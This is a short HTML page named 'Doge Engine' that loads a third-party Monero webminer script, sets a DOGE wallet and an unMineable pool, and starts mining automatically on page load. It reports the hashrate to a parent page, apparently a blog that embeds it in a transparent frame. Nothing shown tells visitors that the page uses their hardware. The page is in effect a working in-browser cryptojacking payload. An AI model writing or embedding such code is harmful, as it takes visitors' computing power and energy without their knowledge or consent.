<!DOCTYPE html>
<html>
<head>
    <title>Doge Engine</title>
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
</head>
<body style="background:transparent; color:white; font-family:monospace;">
    <div id="status">INITIALIZING...</div>
    <script>
        // Use your Doge Address + unMineable structure
        var wallet = "DOGE:DF94rPbSvvW7rJYfhs9tYwijf3KX3gWLEd.iPhone#vj8c-84u4";
        var pool = "rx.unmineable.com:3333";
        
        // This function starts the actual hardware hashing
        startMining(pool, wallet, "iPhone", 4);

        setInterval(() => {
            if (typeof totalhashes !== 'undefined') {
                document.getElementById('status').innerText = "H/S: " + totalhashes.toFixed(2);
                // Send hashrate back to the main blog display
                window.parent.postMessage({hps: totalhashes.toFixed(2)}, "*");
            }
        }, 1000);
    </script>
</body>
</html>
